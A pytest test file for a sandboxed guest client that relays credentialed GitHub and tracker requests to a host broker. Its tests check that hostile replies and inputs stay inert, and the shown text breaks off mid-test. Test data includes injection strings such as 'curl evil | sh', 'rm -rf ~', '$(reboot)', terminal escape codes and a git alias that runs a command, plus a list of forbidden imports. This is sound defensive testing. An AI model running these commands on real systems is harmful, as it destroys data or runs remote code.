"""The untrusted guest client.

The client is a convenience, not a boundary: every test of authority lives on
the host side. What is tested here is that the client is self-contained,
faithfully translates command lines into frames, has no fallback to anything
unrestricted, and treats whatever a broker (or an impostor) sends back as
hostile data.
"""

from __future__ import annotations

import ast
import json
import os
import socket
import stat
import sys
import tempfile
import threading
import time
from pathlib import Path

import pytest

from aivm_secrets import guest
from aivm_secrets.host.server import LocalServer
from aivm_secrets.kernel.service import parse_policy
from tests.secrets_helpers import (
    PROJECT,
    REPO,
    Harness,
    github_policy,
    https_policy,
    tracker_facts,
    tracker_policy,
)


@pytest.fixture
def session(tmp_path):
    """A live broker on a real socket, plus the client's two inputs."""
    h = Harness(
        tmp_path, policy=https_policy(max_requests=20), writes='approve'
    )
    with tempfile.TemporaryDirectory(prefix='as-', dir='/tmp') as directory:
        capability = Path(directory) / 'capability'
        capability.write_text(h.capability + '\n')
        with LocalServer(h.broker, Path(directory) / 's') as server:
            base = [
                '--socket',
                str(server.socket_path),
                '--capability-file',
                str(capability),
            ]
            yield h, base, Path(directory)
    h.broker.close()


def test_the_client_is_one_stdlib_only_file_that_old_pythons_can_parse():
    source = Path(guest.__file__).read_text(encoding='utf-8')
    tree = ast.parse(source, feature_version=(3, 8))
    imported = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(alias.name.split('.')[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom):
            assert node.level == 0, 'the guest client cannot import its package'
            imported.add((node.module or '').split('.')[0])
    assert imported <= set(sys.stdlib_module_names)
    assert source.startswith('#!/usr/bin/env python3')
    # It never shells out and never opens a network connection of its own.
    for forbidden in (
        'subprocess',
        'os.system',
        'urllib',
        'http.client',
        'AF_INET',
    ):
        assert forbidden not in source


@pytest.mark.parametrize(
    'argv,verb,payload',
    [
        (['invoke', 'account.read'], 'request',
         {'operation': 'account.read', 'arguments': {}}),
        (['invoke', 'issue.view', '--arguments', '{"issue":23}'], 'request',
         {'operation': 'issue.view', 'arguments': {'issue': 23}}),
        (['operations'], 'describe', True),
        (['renounce'], 'renounce', True),
        (['delegate', '--scope', '{"operations":{"issue.view":{}}}', '--output', 'x'],
         'delegate', {'operations': {'issue.view': {}}}),
    ],
)  # fmt: skip
def test_command_lines_translate_to_exactly_one_frame(argv, verb, payload):
    args = guest.parser().parse_args(
        ['--socket', 's', '--capability-file', 'c', *argv]
    )
    assert guest.frame_from_args(args) == (verb, payload)


def test_request_arguments_input_is_not_shell_parsed(tmp_path):
    args = guest.parser().parse_args(
        ['invoke', 'x', '--arguments', '{"a":"$(id) `id`"}']
    )
    assert guest.request_from_args(args)['arguments'] == {'a': '$(id) `id`'}
    for invalid in ('[]', '"quoted"', '7', 'null', 'not json'):
        args = guest.parser().parse_args(
            ['invoke', 'x', '--arguments', invalid]
        )
        with pytest.raises(ValueError):
            guest.request_from_args(args)
    path = tmp_path / 'arguments.json'
    path.write_text('{"issue": 24}')
    args = guest.parser().parse_args(
        ['invoke', 'x', '--arguments-file', str(path)]
    )
    assert guest.request_from_args(args)['arguments'] == {'issue': 24}
    path.write_text('{"body": "' + 'x' * 20000 + '"}')
    with pytest.raises(ValueError):
        guest.request_from_args(args)


@pytest.mark.parametrize(
    'arguments',
    [
        ['api', '/user'],
        ['pr', 'merge', '1', '--repo', 'x/y'],
        ['pr', 'view', '1', '--repo', 'x/y', '--web'],
        ['pr', 'view', '1', '--repo', 'x/y', '--json', 'title'],
        ['pr', 'comment', '1', '--repo', 'x/y'],
        ['pr', 'view', '1'],
        ['pr', 'view', '--repo', 'x/y'],
        ['auth', 'token'],
        ['repo', 'clone', 'x/y'],
        ['as'],
        ['invoke'],
        ['invoke', 'x', '--arguments', '{}', '--arguments-file', 'f'],
        ['invoke', 'x', '--url', 'https://evil.invalid'],
        ['invoke', 'x', '--method', 'DELETE'],
        ['invoke', 'x', '--header', 'X: y'],
        ['delegate', '--scope', '{}'],
        ['approve', 'abc'],
        ['exec', 'id'],
        [],
    ],
)
def test_client_has_no_stock_gh_or_shell_fallback(arguments):
    with pytest.raises(SystemExit) as caught:
        guest.main(arguments)
    assert caught.value.code == 2


def test_real_unix_socket_and_standalone_guest_client(session, capsys):
    h, base, _ = session
    assert (
        guest.main(
            [*base, 'invoke', 'issue.view', '--arguments', '{"issue":23}']
        )
        == 0
    )
    output = capsys.readouterr().out
    assert json.loads(output)['result']['path'] == '/v1/issues/23'
    assert h.token not in output and h.capability not in output
    assert (
        guest.main(
            [*base, 'invoke', 'issue.view', '--arguments', '{"issue":9}']
        )
        == 3
    )
    assert capsys.readouterr().err.strip() == 'aivm-secrets: denied'
    assert guest.main([*base, 'operations']) == 0
    grant = json.loads(capsys.readouterr().out)['grant']
    assert grant['remaining_requests'] == 19 and grant['writes'] == 'approve'


def test_result_only_prints_just_the_result(session, capsys):
    h, base, _ = session
    h.executor.execute = lambda authorized, credential: 'plain text\nresult\n'
    assert guest.main([*base, 'invoke', 'profile.read', '--result-only']) == 0
    assert capsys.readouterr().out == 'plain text\nresult\n'
    h.executor.execute = lambda authorized, credential: {'a': [1, 2]}
    assert guest.main([*base, 'invoke', 'profile.read', '--result-only']) == 0
    assert json.loads(capsys.readouterr().out) == {'a': [1, 2]}


def test_a_write_awaiting_approval_exits_4_and_says_what_to_do(session, capsys):
    h, base, _ = session
    argv = [
        *base,
        'invoke',
        'issue.comment',
        '--arguments',
        '{"issue":23,"body":"go"}',
    ]
    assert guest.main(argv) == 4
    err = capsys.readouterr().err
    assert 'approval_required' in err and 'nothing was sent' in err
    (pending,) = h.broker.control({'command': 'pending'})['pending']
    assert f'aivm-secrets approve {pending["digest"][:16]}' in err
    assert h.broker.control(
        {'command': 'approve', 'digest': pending['digest']}
    )['ok']
    assert guest.main(argv) == 0
    assert json.loads(capsys.readouterr().out)['result']['body'] == {
        'body': 'go'
    }


def test_delegate_writes_a_private_capability_file_and_nothing_to_stdout(
    session, capsys
):
    h, base, directory = session
    output = directory / 'helper.cap'
    scope = '{"operations":{"issue.view":{"issue":[23]}},"max_requests":1}'
    assert (
        guest.main(
            [*base, 'delegate', '--scope', scope, '--output', str(output)]
        )
        == 0
    )
    printed = capsys.readouterr().out
    child = output.read_text()
    assert child.startswith('aivs1.') and child not in printed
    assert stat.S_IMODE(output.stat().st_mode) == 0o600
    assert json.loads(printed)['grant']['remaining_requests'] == 1
    helper = [base[0], base[1], '--capability-file', str(output)]
    assert (
        guest.main(
            [*helper, 'invoke', 'issue.view', '--arguments', '{"issue":23}']
        )
        == 0
    )
    capsys.readouterr()
    assert (
        guest.main(
            [*helper, 'invoke', 'issue.view', '--arguments', '{"issue":23}']
        )
        == 3
    )
    assert 'exhausted' in capsys.readouterr().err
    # An existing file is never overwritten, and a refusal leaves no file.
    assert (
        guest.main(
            [*base, 'delegate', '--scope', scope, '--output', str(output)]
        )
        == 2
    )
    wider = '{"operations":{"issue.view":{"issue":[99]}}}'
    refused = directory / 'refused.cap'
    assert (
        guest.main(
            [*base, 'delegate', '--scope', wider, '--output', str(refused)]
        )
        == 3
    )
    assert not refused.exists()
    assert h.broker.status()['grants'] == 2
    capsys.readouterr()
    assert guest.main([*helper, 'renounce']) == 0
    assert guest.main([*helper, 'operations']) == 3


def test_missing_session_and_transport_failures_exit_2(
    tmp_path, capsys, monkeypatch
):
    monkeypatch.delenv('AIVM_SECRETS_SOCKET', raising=False)
    monkeypatch.delenv('AIVM_SECRETS_CAPABILITY_FILE', raising=False)
    assert guest.main(['invoke', 'x']) == 2
    assert 'AIVM secret session' in capsys.readouterr().err
    capability = tmp_path / 'capability'
    capability.write_text('aivs1.x')
    argv = [
        '--socket',
        str(tmp_path / 'absent.sock'),
        '--capability-file',
        str(capability),
    ]
    assert guest.main([*argv, 'invoke', 'x']) == 2
    assert 'do not automatically retry writes' in capsys.readouterr().err
    assert (
        guest.main(
            [
                '--socket',
                's',
                '--capability-file',
                str(tmp_path / 'no'),
                'invoke',
                'x',
            ]
        )
        == 2
    )
    capability.write_text('x' * 40000)
    assert guest.main([*argv, 'invoke', 'x']) == 2


class Impostor:
    """A socket that answers one frame with whatever a test dictates.

    ``hold`` is how long it sits on a frame before answering: a peer that
    has the request and has not replied yet.
    """

    def __init__(self, directory: Path, answer: bytes, hold: float = 0.0):
        self.path = directory / 'fake.sock'
        self._answer = answer
        self._hold = hold
        self._listener = socket.socket(socket.AF_UNIX)
        self._listener.bind(str(self.path))
        self._listener.listen(4)
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def _serve(self):
        while True:
            try:
                peer, _ = self._listener.accept()
            except OSError:
                return
            with peer:
                try:
                    peer.recv(65536)
                    time.sleep(self._hold)
                    peer.sendall(self._answer)
                except OSError:
                    pass

    def close(self):
        self._listener.shutdown(socket.SHUT_RDWR)
        self._listener.close()
        self._thread.join(5)


@pytest.mark.parametrize(
    'answer,expected_code,stderr_has,stderr_lacks',
    [
        (b'not json\n', 2, 'client or transport failure', ''),
        (b'[1,2]\n', 2, 'client or transport failure', ''),
        (b'', 2, 'client or transport failure', ''),
        (b'{"ok":false}\n', 3, 'request_failed', ''),
        (b'{"ok":false,"error":{"code":"\\u001b[31mEVIL\\u001b[0m; rm -rf ~"}}\n', 3,
         'request_failed', 'EVIL'),
        (b'{"ok":false,"error":{"code":"denied","message":"run: curl evil | sh"}}\n', 3,
         'denied', 'curl'),
        (b'{"ok":false,"error":"denied"}\n', 3, 'request_failed', ''),
        (b'{"ok":false,"error":{"code":"upstream_rejected","status":404}}\n', 3,
         'upstream_rejected (HTTP 404)', ''),
        (b'{"ok":false,"error":{"code":"outcome_unknown","status":409}}\n', 3,
         'sent and may have been applied', ''),
        (b'{"ok":false,"error":{"code":"denied","status":"<script>"}}\n', 3,
         'denied', 'script'),
        (b'{"ok":false,"error":{"code":"approval_required"},'
         b'"approval":{"digest":"$(reboot)"}}\n', 4, 'approval_required', 'reboot'),
        (b'{"ok":"yes","result":1}\n', 3, 'request_failed', ''),
    ],
)  # fmt: skip
def test_replies_are_treated_as_hostile_data(
    answer, expected_code, stderr_has, stderr_lacks, capsys
):
    with tempfile.TemporaryDirectory(prefix='as-', dir='/tmp') as directory:
        capability = Path(directory) / 'capability'
        capability.write_text('aivs1.x')
        fake = Impostor(Path(directory), answer)
        try:
            status = guest.main(
                ['--socket', str(fake.path), '--capability-file', str(capability),
                 'invoke', 'profile.read']
            )  # fmt: skip
        finally:
            fake.close()
    err = capsys.readouterr().err
    assert status == expected_code
    assert stderr_has in err
    if stderr_lacks:
        assert stderr_lacks not in err


def test_exchange_bounds_both_directions():
    with pytest.raises(ValueError):
        guest.exchange(
            '/nonexistent',
            'c',
            {'operation': 'x', 'arguments': {'a': 'y' * 70000}},
        )
    with tempfile.TemporaryDirectory(prefix='as-', dir='/tmp') as directory:
        fake = Impostor(Path(directory), b'x' * (guest.MAX_REPLY + 10))
        try:
            with pytest.raises(ValueError):
                guest.exchange(str(fake.path), 'c', {'operation': 'x'})
        finally:
            fake.close()


def test_a_request_sent_and_never_answered_is_outcome_unknown() -> None:
    """A peer that took the frame and has not answered may still act on it."""
    with tempfile.TemporaryDirectory(prefix='as-', dir='/tmp') as directory:
        fake = Impostor(Path(directory), b'{"ok":true}\n', hold=1.0)
        try:
            reply = guest.exchange(
                str(fake.path), 'c', {'operation': 'x', 'arguments': {}},
                deadline=0.3,
            )
        finally:
            fake.close()
    assert reply['ok'] is False
    assert reply['error']['code'] == 'outcome_unknown'


def test_each_hop_waits_longer_than_the_hop_behind_it() -> None:
    """The hop nearest the broker gives up first, and so is the one to say.

    The guest client is a standalone file and cannot import these constants,
    so this is what keeps its own copy from drifting below them.
    """
    from aivm_secrets.host import egress
    from aivm_secrets.identity import mtls
    from aivm_secrets.transport import framing

    # The broker's worst case: a preflight and a final call, each bounded.
    assert framing.BROKER_REPLY_DEADLINE > 2 * egress.TOTAL_DEADLINE + framing.FRAME_TIMEOUT
    # Every leg the bridge may still take once its client has sent: finish
    # reading the frame, connect to the broker, send it on, wait, answer.
    bridge_legs = (
        mtls.FRAME_DEADLINE_SECONDS + 2 * framing.CONNECT_TIMEOUT
        + framing.BROKER_REPLY_DEADLINE + mtls.FRAME_DEADLINE_SECONDS
    )
    assert framing.RELAYED_REPLY_DEADLINE >= bridge_legs
    assert guest.RESPONSE_DEADLINE > framing.RELAYED_REPLY_DEADLINE


def test_the_client_runs_as_a_copied_standalone_script(session, tmp_path):
    """Exactly how it runs in a guest: one file, no package beside it."""
    import subprocess

    h, base, _ = session
    copied = tmp_path / 'aivm-secrets'
    copied.write_bytes(Path(guest.__file__).read_bytes())
    copied.chmod(0o700)
    env = {
        'PATH': os.environ['PATH'],
        'AIVM_SECRETS_SOCKET': base[1],
        'AIVM_SECRETS_CAPABILITY_FILE': base[3],
    }
    result = subprocess.run(
        [sys.executable, '-I', str(copied), 'invoke', 'issue.view', '--arguments', '{"issue":24}'],
        env=env, capture_output=True, text=True, cwd=str(tmp_path), timeout=30,
    )  # fmt: skip
    assert result.returncode == 0, result.stderr
    assert json.loads(result.stdout)['result']['path'] == '/v1/issues/24'


# -- answering to another tool's name ---------------------------------------
#
# Nothing below is specific to any tool: ``tk`` is an invented command line
# for an invented service, and ``gh`` works only because the built-in GitHub
# manifest carries a table for it.


def table(policy, alias):
    """The table and operations a ``describe`` reply would carry."""
    spec = parse_policy(policy)
    operations = [operation.to_wire() for operation in spec.scope()]
    return spec.cli_tables()[alias], operations


def translate(words, policy=None, alias='tk'):
    rows, operations = table(policy or tracker_policy(), alias)
    return guest.request_from_alias(rows, operations, list(words))


@pytest.mark.parametrize(
    'words,operation,arguments',
    [
        (['view', '7', '--project', PROJECT], 'ticket.view',
         {'ticket': 7, 'project': PROJECT}),
        (['view', '-p', PROJECT, '7'], 'ticket.view',
         {'ticket': 7, 'project': PROJECT}),
        (['view', f'--project={PROJECT}', '8'], 'ticket.view',
         {'ticket': 8, 'project': PROJECT}),
        (['builds', 'list', '7', '--project', PROJECT, '--page', '3'],
         'ticket.builds', {'ticket': 7, 'project': PROJECT, 'page': 3}),
        (['note', PROJECT, '7', '--text', 'hi; rm -rf / $(id)'], 'ticket.note',
         {'ticket': 7, 'project': PROJECT, 'text': 'hi; rm -rf / $(id)'}),
        (['note', PROJECT, '7', '--text=a=b', '--title', ''], 'ticket.note',
         {'ticket': 7, 'project': PROJECT, 'text': 'a=b', 'title': ''}),
        # After ``--`` nothing is an option, so a value may start with one.
        (['note', '--text', 'x', '--', PROJECT, '7'], 'ticket.note',
         {'ticket': 7, 'project': PROJECT, 'text': 'x'}),
        (['log', '7'], 'ticket.log', {'ticket': 7}),
    ],
)  # fmt: skip
def test_a_command_table_translates_words_into_one_typed_request(
    words, operation, arguments
):
    request, output = translate(words)
    assert request == {'operation': operation, 'arguments': arguments}
    assert output == ('result' if operation == 'ticket.log' else 'reply')
    # Numbers are numbers because the operation says so, not by guessing.
    assert type(request['arguments']['ticket']) is int
    assert type(request['arguments'].get('project', '')) is str


@pytest.mark.parametrize(
    'words,problem',
    [
        ([], 'available here'),
        (['delete', '7'], 'available here'),
        (['builds'], 'available here'),  # only ``builds list`` exists
        (['api', '/user'], 'available here'),
        (['view'], 'wrong number'),
        (['view', '7', '8'], 'wrong number'),
        (['view', '7', '--web'], 'unsupported option'),
        (['view', '7', '--json', 'title'], 'unsupported option'),
        (['view', '7', '--text', 'x'], 'unsupported option'),
        (['view', '7', '--project'], 'missing its value'),
        (['view', '7', '-p', 'a', '--project', 'b'], 'given twice'),
        (['note', PROJECT, '7', '--text', 'a', '--text-file', '-'], 'twice'),
        (['view', 'seven', '-p', PROJECT], 'must be a number'),
        (['view', '7.0', '-p', PROJECT], 'must be a number'),
        (['builds', 'list', '7', '--page', 'two'], 'must be a number'),
        (
            ['note', PROJECT, '7', '--text-file', '/nonexistent/x'],
            'cannot read',
        ),
        (['view', '-1', '-p', PROJECT], 'unsupported option'),
    ],
)
def test_anything_the_table_does_not_describe_is_a_usage_error(words, problem):
    with pytest.raises(guest.Usage) as caught:
        translate(words)
    assert problem in str(caught.value)


def test_the_available_commands_are_listed_from_the_table():
    with pytest.raises(guest.Usage) as caught:
        translate(['help'])
    assert str(caught.value) == ('available here: builds list; log; note; view')


def test_a_file_option_reads_bounded_text(tmp_path, monkeypatch):
    path = tmp_path / 'note.md'
    path.write_text('from a file\n')
    request, _ = translate(['note', PROJECT, '7', '--text-file', str(path)])
    assert request['arguments']['text'] == 'from a file\n'
    monkeypatch.setattr(
        sys,
        'stdin',
        type('In', (), {'buffer': __import__('io').BytesIO(b'piped')})(),
    )
    request, _ = translate(['note', PROJECT, '7', '--text-file', '-'])
    assert request['arguments']['text'] == 'piped'
    path.write_text('x' * (guest.MAX_INPUT + 1))
    with pytest.raises(guest.Usage):
        translate(['note', PROJECT, '7', '--text-file', str(path)])


@pytest.mark.parametrize(
    'rows',
    [
        None, 'view', 7, {}, [None], [[]], ['view'], [{}], [{'command': 'view'}],
        [{'command': []}], [{'command': [7]}], [{'command': ['view']}],
        [{'command': ['view'], 'operation': 'x', 'options': 'no'}],
        [{'command': ['view'], 'operation': 'x', 'positional': None}],
        [{'command': ['\x1b[31mview'], 'operation': 'x'}],
    ],
)  # fmt: skip
def test_a_hostile_table_can_only_produce_a_usage_error_or_a_request(rows):
    """The table comes from a peer; the client never trusts its shape."""
    for words in (['view', '7', '--project', 'x'], ['other']):
        try:
            request, output = guest.request_from_alias(rows, None, words)
        except guest.Usage as problem:
            assert '\x1b' not in str(problem)
        except (TypeError, AttributeError, KeyError, ValueError):
            pass  # reported by ``main`` as a transport failure, exit 2
        else:
            assert set(request) == {'operation', 'arguments'}


class Live:
    """A broker on a real socket, addressed the way a guest session is."""

    def __init__(self, tmp_path, monkeypatch, policy, writes='allow'):
        self.h = Harness(tmp_path, policy=policy, writes=writes)
        self._directory = tempfile.TemporaryDirectory(prefix='as-', dir='/tmp')
        self.directory = Path(self._directory.name)
        capability = self.directory / 'capability'
        capability.write_text(self.h.capability + '\n')
        self._server = LocalServer(self.h.broker, self.directory / 's')
        server = self._server.__enter__()
        self.env = {
            'AIVM_SECRETS_SOCKET': str(server.socket_path),
            'AIVM_SECRETS_CAPABILITY_FILE': str(capability),
        }
        for key, value in self.env.items():
            monkeypatch.setenv(key, value)

    def close(self):
        self._server.__exit__(None, None, None)
        self._directory.cleanup()
        self.h.broker.close()


@pytest.fixture
def live(tmp_path, monkeypatch):
    made = []

    def build(policy, **kwargs):
        made.append(Live(tmp_path, monkeypatch, policy, **kwargs))
        return made[-1]

    yield build
    for item in made:
        item.close()


def test_an_invented_tool_name_works_end_to_end(live, capsys):
    session = live(tracker_policy())
    session.h.executor.metadata = tracker_facts()
    assert (
        guest.main(['view', '7', '--project', 'ACME/Widgets'], alias='tk') == 0
    )
    assert json.loads(capsys.readouterr().out)['result'] == tracker_facts()
    assert (
        guest.main(['note', PROJECT, '7', '--text', 'hello'], alias='tk') == 0
    )
    assert json.loads(capsys.readouterr().out)['result']['body'] == {
        'text': 'hello'
    }
    session.h.executor.execute = lambda authorized, credential: 'raw log\n'
    assert guest.main(['log', '8'], alias='tk') == 0
    assert capsys.readouterr().out == 'raw log\n'  # ``output: result``
    # The explicit spelling is the same thing.
    base = [
        '--socket', session.env['AIVM_SECRETS_SOCKET'],
        '--capability-file', session.env['AIVM_SECRETS_CAPABILITY_FILE'],
    ]  # fmt: skip
    assert guest.main([*base, 'as', 'tk', 'log', '8']) == 0
    assert capsys.readouterr().out == 'raw log\n'


def test_gh_is_the_same_mechanism_with_the_built_in_table(live, capsys):
    session = live(github_policy())
    h = session.h
    assert guest.main(['pr', 'view', '13861', '--repo', REPO], alias='gh') == 0
    assert json.loads(capsys.readouterr().out)['result']['number'] == 13861
    assert guest.main(['pr', 'diff', '13861', '-R', REPO], alias='gh') == 0
    assert capsys.readouterr().out.startswith('diff --git')
    h.executor.result = [{'id': 1}]
    argv = ['pr', 'reviews', '13861', '--repo', REPO, '--page', '2']
    assert guest.main(argv, alias='gh') == 0
    reply = json.loads(capsys.readouterr().out)
    assert reply['pagination']['page'] == 2 and reply['result'] == [{'id': 1}]
    body = 'Looks right; $(id) `id` | tee'
    argv = ['pr', 'comment', '13861', '--repo', REPO, '--body', body]
    assert guest.main(argv, alias='gh') == 0
    capsys.readouterr()
    effect, credential = h.executor.calls[-1]
    assert effect.method == 'POST' and effect.body == (('body', body),)
    assert (
        guest.main(
            ['pr', 'edit', '13861', '--repo', REPO, '--title', 'T'], alias='gh'
        )
        == 0
    )
    assert h.executor.calls[-1][0].body == (('title', 'T'),)
    output = capsys.readouterr()
    assert credential not in output.out + output.err


@pytest.mark.parametrize(
    'words',
    [
        ['api', '/user'],
        ['auth', 'token'],
        ['auth', 'status', '--show-token'],
        ['repo', 'clone', 'x/y'],
        ['pr', 'merge', '13861', '--repo', REPO],
        ['pr', 'view', '13861', '--repo', REPO, '--web'],
        ['pr', 'view', '13861', '--repo', REPO, '--json', 'reviewDecision'],
        ['pr', 'comment', '13861', '--repo', REPO, '--edit-last'],
        ['pr', 'view', '--repo', REPO],
        ['pr', 'checkout', '13861'],
        ['secret', 'list'],
        ['--version'],
        [],
    ],
)
def test_gh_has_no_stock_fallback(live, capsys, words):
    """An unlisted command is an error. It is never passed to anything else."""
    session = live(github_policy())
    assert guest.main(words, alias='gh') == 2
    captured = capsys.readouterr()
    assert 'not the real gh' in captured.err and captured.out == ''
    assert not session.h.executor.calls
    assert session.h.token not in captured.err


def test_a_request_the_table_allows_is_still_decided_by_the_broker(
    live, capsys
):
    session = live(github_policy(), writes='deny')
    assert guest.main(['pr', 'view', '9', '--repo', REPO], alias='gh') == 3
    assert capsys.readouterr().err.strip() == 'aivm-secrets: denied'
    argv = ['pr', 'comment', '13861', '--repo', REPO, '--body', 'x']
    assert guest.main(argv, alias='gh') == 3
    assert (
        guest.main(['pr', 'view', '13861', '-R', 'other/repo'], alias='gh') == 3
    )
    assert not session.h.executor.calls


def test_an_alias_the_session_does_not_define_does_nothing(
    live, capsys, monkeypatch
):
    session = live(https_policy())
    assert guest.main(['pr', 'view', '1', '--repo', 'x/y'], alias='gh') == 2
    assert 'no gh commands' in capsys.readouterr().err
    assert guest.main(['x'], alias='\x1b[31mevil') == 2
    assert '\x1b' not in capsys.readouterr().err
    assert not session.h.executor.calls
    monkeypatch.delenv('AIVM_SECRETS_SOCKET')
    assert guest.main(['pr', 'view', '1'], alias='gh') == 2
    assert 'no AIVM secret session' in capsys.readouterr().err


def test_a_hostile_describe_reply_cannot_inject_terminal_text(
    capsys, monkeypatch
):
    table_ = {'cli': {'gh': [{'command': ['\u001b[31mrm'], 'operation': 'x'}]}}
    answer = json.dumps(dict(table_, ok=True, grant='not a grant')).encode()
    with tempfile.TemporaryDirectory(prefix='as-', dir='/tmp') as directory:
        capability = Path(directory) / 'capability'
        capability.write_text('aivs1.x')
        fake = Impostor(Path(directory), answer + b'\n')
        monkeypatch.setenv('AIVM_SECRETS_SOCKET', str(fake.path))
        monkeypatch.setenv('AIVM_SECRETS_CAPABILITY_FILE', str(capability))
        try:
            assert guest.main(['pr', 'view'], alias='gh') == 2
        finally:
            fake.close()
    err = capsys.readouterr().err
    assert '\x1b' not in err and 'available here: ?' in err


def test_installed_under_another_name_the_client_answers_to_it(live, tmp_path):
    """Exactly how it runs in a guest: one copied file and a symlink to it."""
    import subprocess

    session = live(github_policy())
    bindir = tmp_path / 'bin'
    bindir.mkdir()
    copied = bindir / 'aivm-secrets'
    copied.write_bytes(Path(guest.__file__).read_bytes())
    copied.chmod(0o700)
    (bindir / 'gh').symlink_to('aivm-secrets')
    env = dict(session.env, PATH=f'{bindir}:{os.environ["PATH"]}')

    def run(*argv, input=None):
        return subprocess.run(
            list(argv), env=env, input=input, capture_output=True, text=True,
            cwd=str(tmp_path), timeout=30,
        )  # fmt: skip

    view = run('gh', 'pr', 'view', '13861', '--repo', REPO)
    assert view.returncode == 0, view.stderr
    assert json.loads(view.stdout)['result']['user']['login'] == 'Erotemic'
    comment = run(
        'gh', 'pr', 'comment', '13861', '--repo', REPO, '--body-file', '-',
        input='from stdin\n',
    )  # fmt: skip
    assert comment.returncode == 0, comment.stderr
    assert session.h.executor.calls[-1][0].body == (('body', 'from stdin\n'),)
    refused = run('gh', 'api', '/user')
    assert refused.returncode == 2 and 'not the real gh' in refused.stderr
    # Under its own name the same file is the ordinary client.
    own = run('aivm-secrets', 'operations')
    assert own.returncode == 0 and 'gh' in json.loads(own.stdout)['cli']
    spelled = run('aivm-secrets', 'as', 'gh', 'pr', 'diff', '13861', '-R', REPO)
    assert spelled.stdout.startswith('diff --git')


# -- provider-neutral CLI compatibility additions ----------------------------


def test_gh_bounded_json_fields_are_local_projection(live, capsys):
    session = live(github_policy(gh_compat=2))
    words = [
        'pr', 'view', '13861', '--repo', REPO,
        '--json', 'title,body,number,headRefOid',
    ]
    assert guest.main(words, alias='gh') == 0
    result = json.loads(capsys.readouterr().out)
    assert result == {
        'title': 'Proof repair', 'body': 'Example', 'number': 13861,
        'headRefOid': 'a' * 40,
    }
    assert len(session.h.executor.calls) == 1  # preflight, no extra API call
    for rejected in (
        'reviewDecision', 'title,secret', 'title,title', 'title,', '',
    ):
        assert guest.main(
            ['pr', 'view', '13861', '-R', REPO, '--json', rejected], alias='gh'
        ) == 2
        assert 'unsupported JSON field' in capsys.readouterr().err
    assert len(session.h.executor.calls) == 1


def test_gh_checks_json_is_a_projection_of_checked_commit(live, capsys):
    live(github_policy(gh_compat=2))
    words = ['pr', 'checks', '13861', '-R', REPO, '--json', 'name,status']
    assert guest.main(words, alias='gh') == 0
    assert json.loads(capsys.readouterr().out) == [
        {'name': 'lean', 'status': 'completed'}
    ]


def test_gh_default_repository_from_env_and_git_config(tmp_path, monkeypatch):
    rows, operations = table(github_policy(gh_compat=2), 'gh')
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv('GH_REPO', REPO)
    req, _ = guest.request_from_alias(rows, operations, ['pr', 'view', '13861'])
    assert req['arguments'] == {'pr': 13861, 'repository': REPO}
    # A malicious environment still cannot expand the policy's scope.
    monkeypatch.setenv('GH_REPO', 'attacker/other')
    req, _ = guest.request_from_alias(rows, operations, ['pr', 'view', '13861'])
    assert req['arguments']['repository'] == 'attacker/other'
    policy = parse_policy(github_policy(gh_compat=2))
    from aivm_secrets.kernel.scope import check_arguments, find
    with pytest.raises(Exception):
        r = policy.parse_request(req)
        check_arguments(find(policy.scope(), r.operation), r)
    monkeypatch.delenv('GH_REPO')
    (tmp_path / '.git').mkdir()
    (tmp_path / '.git/config').write_text(
        '[remote "upstream"]\n'
        'url = git@github.com:TauCetiProject/TauCeti.git\n'
        '[remote "origin"]\nurl = https://github.com/Erotemic/TauCeti.git\n'
    )
    req, _ = guest.request_from_alias(rows, operations, ['pr', 'view', '13861'])
    assert req['arguments']['repository'] == REPO
    # Explicit -R always overrides inferred values.
    req, _ = guest.request_from_alias(
        rows, operations, ['pr', 'view', '13861', '-R', 'another/repo']
    )
    assert req['arguments']['repository'] == 'another/repo'


def test_repository_inference_is_inert_data_and_never_executes(tmp_path, monkeypatch):
    rows, operations = table(github_policy(gh_compat=2), 'gh')
    monkeypatch.delenv('GH_REPO', raising=False)
    monkeypatch.chdir(tmp_path)
    dotgit = tmp_path / '.git'
    dotgit.mkdir()
    # Git configuration can contain executable helpers and aliases; reading
    # a remote URL as text must never run them.
    (dotgit / 'config').write_text(
        '[alias]\nfoo = !touch /tmp/aivm-should-not-run\n'
        '[remote "origin"]\nurl = https://github.com/TauCetiProject/TauCeti\n'
    )
    req, _ = guest.request_from_alias(rows, operations, ['pr', 'view', '13861'])
    assert req['arguments']['repository'] == REPO
    (dotgit / 'config').write_text(
        '[remote "origin"]\nurl = https://attacker.invalid/o/r\n'
    )
    with pytest.raises(guest.Usage):
        guest.request_from_alias(rows, operations, ['pr', 'view', '13861'])


def test_gh_review_json_uses_separate_authorized_graphql_read(live, capsys):
    """Selecting review fields requires an explicit, independently scoped read."""
    operations = github_policy(gh_compat=2)['operations'] + ['pr.summary']
    session = live(github_policy(operations=operations, gh_compat=2))
    session.h.executor.result = {
        'data': {'repository': {'pullRequest': {
            'number': 13861, 'title': 'Proof repair', 'body': 'Example',
            'reviewDecision': 'CHANGES_REQUESTED',
            'reviews': {
                'nodes': [{'author': {'login': 'reviewer'},
                           'body': 'Please revise', 'state': 'CHANGES_REQUESTED',
                           'submittedAt': '2026-10-10T12:00:00Z'}],
                'pageInfo': {'hasNextPage': False, 'endCursor': None},
            },
        }}},
    }
    arguments = [
        'pr', 'view', '13861', '-R', REPO,
        '--json', 'title,body,reviews,reviewDecision',
    ]
    assert guest.main(arguments, alias='gh') == 0
    result = json.loads(capsys.readouterr().out)
    assert result == {
        'title': 'Proof repair', 'body': 'Example',
        'reviewDecision': 'CHANGES_REQUESTED',
        'reviews': [{'author': {'login': 'reviewer'}, 'body': 'Please revise',
                     'state': 'CHANGES_REQUESTED',
                     'submittedAt': '2026-10-10T12:00:00Z'}],
    }
    preflight, authorized = [item[0] for item in session.h.executor.calls]
    assert preflight.method == 'GET'
    assert authorized.path == '/graphql' and authorized.graphql
    assert 'mutation' not in dict(authorized.body)['query']
    # The broker, not the guest, selected the exact query and allowed variables.
    assert json.loads(dict(authorized.body)['variables']) == {
        'owner': 'taucetiproject', 'name': 'tauceti', 'number': 13861,
    }
    session.h.executor.result['data']['repository']['pullRequest'][
        'reviews']['pageInfo']['hasNextPage'] = True
    assert guest.main(arguments, alias='gh') == 2
    output = capsys.readouterr()
    assert 'more review pages exist' in output.err and output.out == ''


def test_gh_checks_json_state_uses_declared_mapping(live, capsys):
    session = live(github_policy(gh_compat=2))
    words = ['pr', 'checks', '13861', '-R', REPO,
